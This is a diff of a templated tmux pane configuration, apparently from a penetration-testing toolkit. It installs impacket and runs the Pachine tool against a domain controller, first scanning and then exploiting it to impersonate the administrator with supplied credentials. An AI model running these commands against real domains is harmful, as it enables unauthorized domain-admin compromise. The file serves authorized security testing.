@@ -73,11 +73,10 @@ windows:
           - echo "test"
           - python3 -m pip install ldap3 impacket
           - python3 pachine.py -dc-host <%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
-          #- pipenv run python3 pachine.py -dc-host dc.<%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
         - exploit:
           - printf '\033]2;%s\033\\' 'exploit'
           - cd /opt/nomad-tools/
-          - <%= @settings["domain"] %> "cd Pachine; pienv run python3 pachine.py -dc-host <%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; echo -e "\e[0;32mUpdate DC Netbios name\033[0m"
+          - <%= @settings["prefill"] %> "cd Pachine; pipenv run python3 pachine.py -dc-host <%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; echo -e "\e[0;32mUpdate DC Netbios name\033[0m"
   - bloodhound: 
       panes:
         - bloodhound:
